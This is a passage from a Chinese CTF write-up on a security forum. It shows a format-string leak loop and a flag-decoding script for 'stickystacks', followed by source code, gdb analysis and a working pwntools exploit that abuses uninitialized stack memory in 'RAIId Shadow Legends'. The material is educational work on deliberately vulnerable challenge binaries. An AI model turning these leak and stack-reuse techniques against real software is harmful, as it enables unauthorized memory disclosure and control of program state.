
```bash
for i in `seq 1 50`; do perl -e 'print "%${ARGV[0]}\$p"' $i | ./stickystacks | grep Welcome | awk '{print $2}'; done
```

![image.png](https://bbs.kanxue.com/upload/attach/202104/830671_79VFTJB6FB86SK5.jpg)

红色部分为`flag`。因为，在其中的前后部分明显可以看到 `7b` (`{`) `7d` (`}`)，还有 `0a` (`\n`)。复制这一段，通过添加空格，全部替换等操作，写一个脚本，跑出`flag`。

```python
a = [[0x6c,0x65,0x77,0x7b,0x66,0x74,0x63,0x61],[0x61,0x62,0x5f,0x6d,0x27,0x69,0x5f,0x6c],[0x6c,0x62,0x5f,0x6e,0x69,0x5f,0x6b,0x63],[0x5f,0x73,0x65,0x79,0x5f,0x6b,0x63,0x61],[0x6b,0x63,0x61,0x62,0x5f,0x6d,0x27,0x69],[0x5f,0x65,0x68,0x74,0x5f,0x6e,0x69,0x5f],[0x65,0x62,0x5f,0x6b,0x63,0x61,0x74,0x73],[0x34,0x39,0x32,0x31,0x35,0x62,0x39,0x63],[0x34,0x38,0x36,0x37,0x37,0x64,0x61,0x65],[0x0a,0x7d,0x33,0x39,0x35,0x66,0x31,0x61]]
b = []
for i in a:
  for j in range(len(i)):
    b.append(chr(i[len(i)-1-j]))
print(''.join(b))
```

![image.png](https://bbs.kanxue.com/upload/attach/202104/830671_6EKTCZPHREUYGTN.jpg)

看到一个`writeup`用 `CyberChef` 这个神器，才想起来有这个东西:(

> 8b6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4j5$3S2I4i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6o6P5h3u0W2M7V1y4Z5k6h3k6Q4x3V1k6Q4x3U0y4J5k6h3y4A6M7r3g2Q4x3@1c8r3M7X3!0E0i4K6g2X3d9r3g2^5i4K6t1^5i4K6t1%4b7i4g2@1L8#2)9J5y4#2)9J5z5g2u0W2N6X3g2J5M7$3g2Q4x3U0S2Q4x3U0N6o6K9r3q4J5j5h3y4@1k6i4u0Q4x3U0N6Q4x3U0W2Q4x3U0k6S2L8i4m8Q4x3@1u0A6L8Y4m8#2N6q4)9K6c8p5#2t1k6%4N6k6g2r3c8C8e0i4A6y4P5V1!0f1e0e0q4z5K9W2W2\*7e0g2c8k6P5p5y4B7b7U0c8y4P5W2q4\*7e0@1c8y4x3V1#2\*7j5%4A6z5P5W2V1H3e0X3A6q4x3V1&6c8L8%4N6W2c8p5@1H3e0i4A6C8P5V1#2B7e0i4S2y4P5W2f1J5e0h3A6y4y4f1&6B7e0f1E0y4d9r3M7J5e0W2c8k6P5f1&6i4h3e0u0k6K9W2W2\*7e0X3A6q4x3@1&6p5j5%4A6o6K9V1t1@1e0W2N6k6x3V1&6f1h3e0c8z5P5W2p5I4h3X3A6K9L8p5&6B7K9K6q4K9k6$3!0%4k6f1c8K9K9f1&6B7e0e0u0y4g2q4W2&6e0W2N6k6x3W2A6p5d9e0y4z5K9X3E0w2e0f1S2Y4x3g2A6B7j5%4A6z5K9W2f1K6e0#2c8h3L8f1&6E0d9e0u0y4P5W2W2^5b7$3A6n7y4p5&6E0e0e0u0y4K9W2k6E0e0X3#2g2x3V1!0f1g2X3#2z5L8f1V1J5e0i4N6G2N6$3g2p5h3i4S2z5K9V1V1I4h3X3A6K9K9@1#2B7j5K6u0a6g2q4k6E0e0X3#2y4d9@1#2t1k6K6u0k6P5W2V1I4e0Y4A6U0x3#2W2B7h3e0u0z5P5W2p5J5e0i4A6k6P5p5y4Y4L8@1D9`.

![image.png](https://bbs.kanxue.com/upload/attach/202104/830671_4X7MSSVK76QCTCF.jpg)

## 5. RAIId Shadow Legends

> I love how C++ initializes everything for you. It makes things so easy and fun!
> Speaking of fun, play our fun new game [RAIId Shadow Legends](https://bbs.kanxue.com/elink@682K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3K9h3I4W2M7#2)9J5k6h3q4U0N6r3k6Q4x3X3g2U0L8#2)9J5c8X3k6S2y4h3j5K6x3$3j5&6z5e0N6T1z5h3q4T1k6o6M7#2y4U0V1$3k6h3u0T1j5$3t1^5y4o6R3#2j5X3t1I4x3$3t1H3y4X3p5%4j5e0g2X3k6U0g2W2y4U0p5&6k6o6m8U0x3h3x3&6k6U0W2X3y4U0q4X3z5e0j5@1j5K6S2Q4x3V1k6J5j5h3W2A6k6q4)9#2k6Y4y4Z5j5h3c8G2N6#2)9#2k6X3I4W2k6$3g2F1k6s2x3`.) ([source](https://bbs.kanxue.com/elink@d30K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3K9h3I4W2M7#2)9J5k6h3q4U0N6r3k6Q4x3X3g2U0L8#2)9J5c8U0u0V1x3o6t1K6k6U0b7^5y4U0V1K6y4U0M7@1z5e0W2T1y4e0u0T1k6X3k6X3k6e0c8T1j5X3q4S2y4e0b7J5z5h3x3J5x3X3q4V1y4K6c8V1y4e0V1H3y4e0x3&6k6o6k6W2y4o6b7I4z5r3q4S2k6e0V1%4z5h3u0W2y4e0N6Q4x3V1k6J5j5h3W2A6k6q4)9#2k6Y4y4Z5j5h3c8G2N6#2)9#2k6X3I4W2k6$3g2F1k6s2y4Q4x3X3g2U0M7s2l9`.)) at `/problems/2021/raiid_shadow_legends` on the shell server, or connect with `nc shell.actf.co 21300`.
> Author: `kmh`

### 步骤一：查看源码

很明显地看到源码前面有 `ifstream flag("flag.txt")`，那么就先看看有没有哪里打印`flag`：`37`行 `...<< flag.rdbuf() << endl;`，需要`player.skill == 1337`并且`action == "2"`才能运行这一行代码打印`flag`，`player`是`character`结构体。
再来看程序主体功能：先调用`terms_and_conditions`函数打印条款，然后调用`play`函数进行`play`。

```cpp
#include <iostream>
#include <fstream>
#include <string>
using namespace std;
ifstream flag("flag.txt");
struct character {
int health;
int skill;
long tokens;
string name;
};
void play() {
string action;
character player;
cout << "Enter your name: " << flush;
getline(cin, player.name);
cout << "Welcome, " << player.name << ". Skill level: " << player.skill << endl;
while (true) {
cout << "\n1. Power up" << endl;
cout << "2. Fight for the flag" << endl;
cout << "3. Exit game\n" << endl;
cout << "What would you like to do? " << flush;
cin >> action;
cin.ignore();
if (action == "1") {
cout << "Power up requires shadow tokens, available via in app purchase." << endl;
} else if (action == "2") {
if (player.skill < 1337) {
cout << "You flail your arms wildly, but it is no match for the flag guardian. Raid failed." << endl;
} else if (player.skill > 1337) {
cout << "The flag guardian quickly succumbs to your overwhelming power. But the flag was destroyed in the frenzy!" << endl;
} else {
cout << "It's a tough battle, but you emerge victorious. The flag has been recovered successfully: " << flag.rdbuf() << endl;
}
} else if (action == "3") {
return;
}
}
}
void terms_and_conditions() {
string agreement;
string signature;
cout << "\nRAIId Shadow Legends is owned and operated by Working Group 21, Inc. ";
cout << "As a subsidiary of the International Organization for Standardization, ";
cout << "we reserve the right to standardize and/or destandardize any gameplay ";
cout << "elements that are deemed fraudulent, unnecessary, beneficial to the ";
cout << "player, or otherwise undesirable in our authoritarian society where ";
cout << "social capital has been eradicated and money is the only source of ";
cout << "power, legal or otherwise.\n" << endl;
cout << "Do you agree to the terms and conditions? " << flush;
cin >> agreement;
cin.ignore();
while (agreement != "yes") {
cout << "Do you agree to the terms and conditions? " << flush;
cin >> agreement;
cin.ignore();
}
cout << "Sign here: " << flush;
getline(cin, signature);
}
int main() {
cout << "Welcome to RAIId Shadow Legends!" << endl;
while (true) {
cout << "\n1. Start game" << endl;
cout << "2. Purchase shadow tokens\n" << endl;
cout << "What would you like to do? " << flush;
string action;
cin >> action;
cin.ignore();
if (action == "1") {
terms_and_conditions();
play();
} else if (action == "2") {
cout << "Please mail a check to RAIId Shadow Legends Headquarters, 1337 Leet Street, 31337." << endl;
}
}
}
```

```bash
$ checksec --file=raiid_shadow_legends
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY    Fortified    Fortifiable
FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH
78) Symbols      No
0               0                 raiid_shadow_legends
```

### 步骤二：调试分析

`action`可以通过输入使得它的值为`2`，但是`player.skill`没有提供输入来改变它。首先想到的就是通过栈溢出来覆盖它的值，输入字符串的地方有三处：1）`agreement`让我们输入“`yes`”；2）输入`signature`；3）输入`player.name`。
这三个变量`agreement`、`signature`和`player`都是局部变量，且没有进行初始化，所以，他们都是在栈中的。
`player.name`是`c++`中的`string`类型变量，栈中存储的是输入的字符串的地址，是没法通过它来栈溢出的。下面通过`gdb`来调试分析，在`play`函数下断点，然后`name`输入“`aaaa`”，此时结果如下所示。验证了前面所说，是没法通过`player.name`来覆盖`skill`的。
![image.png](https://bbs.kanxue.com/upload/attach/202104/830671_CCSSVAT6HGFEPQN.jpg)
往下走，看看`player.skill`在栈的哪个位置，和两外两个输入有没有关系。通过`IDA`分析，`<< player.skill`在`getline`函数的后面第4个`call`，单步执行到这，如下所示。`play.skill`是第二个参数，会`mov`给`rsi`，而由下面的调试过程可知，是将`rax`的值给`rsi`，而`rax`值的来源是`rbp-0x4c`。计算`rbp-0x4c`得到`0x7fffffffddb4`，正是`yes`字符串所处的地址。**因此，如果`yes`后面接`1337`，那么就能将`play.skill`的值变成`1337`！**![image.png](https://bbs.kanxue.com/upload/attach/202104/830671_FSUCSBHYZJ4YG2T.jpg)
![image.png](https://bbs.kanxue.com/upload/attach/202104/830671_Q3XX4TWTPX8AWQ9.jpg)
而前面输入“`yes`”的时候是会进行判断的，需要输入“`yes`”才会退出这个循环，否则会让用户一直输入。那么就多输入1次来看看情况，先输入`yesabbbb`，然后输入`yes`。可以看到，结果是栈里相应地址里的内容后4位已经改成了`bbbb`。
![image.png](https://bbs.kanxue.com/upload/attach/202104/830671_ATT9B74T5NGNQA4.jpg)
![image.png](https://bbs.kanxue.com/upload/attach/202104/830671_SCXN9PRD5DMJ56R.jpg)

### 步骤三：编写exp获取flag

```python
from pwn import *
context.log_level='debug'

def get_sh(other_libc = null):
  if args['REMOTE']:
    return remote(sys.argv[1], sys.argv[2])
  else:
    return process("./raiid_shadow_legends")

p = get_sh()

p.recvuntil('What would you like to do?')
p.sendline('1')
p.recvuntil('Do you agree to the terms and conditions?')
p.sendline(b'yesa' + p32(0x539))

p.recvuntil('Do you agree to the terms and conditions?')
p.sendline('yes')
p.recvuntil('Sign here:')
p.sendline('bbbb')
p.recvuntil('Enter your name:')
p.sendline('bbbb')
p.recvuntil('What would you like to do?')
p.sendline('2')
p.recvuntil("It's a tough battle, but you emerge victorious. The flag has been recovered successfully: ")
flag = p.recvline()
print(flag)
```

![image.png](https://bbs.kanxue.com/upload/attach/202104/830671_XK8KF2WJAGMDH4S.jpg)

## 参考文献

- fb1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6J5P5h3q4F1i4K6u0V1j5$3c8Q4x3V1k6U0N6r3k6Q4x3V1k6@1M7X3g2W2i4K6u0r3L8h3q4K6N6r3g2J5i4K6u0r3x3U0l9J5x3g2)9J5c8X3q4F1k6%4y4@1M7X3!0E0j5%4c8X3i4K6u0r3j5X3W2F1j5i4u0&6i4K6u0r3M7%4c8A6j5$3E0&6M7%4c8S2j5$3E0K6
- 634K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6@1K9h3#2W2i4K6u0W2L8%4u0Y4i4K6u0r3N6%4u0A6N6r3g2#2M7q4)9J5c8U0t1%4x3o6b7@1
- d2fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6@1K9h3#2W2i4K6u0W2L8%4u0Y4i4K6u0r3N6%4u0A6N6r3g2#2M7q4)9J5c8U0t1%4x3o6b7#2

最后于 2021-4-12 13:27 被`ztree`编辑，原因：

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)
[#溢出](https://bbs.kanxue.com/forum-171-1-182.htm)
[#格式化](https://bbs.kanxue.com/forum-171-1-183.htm)
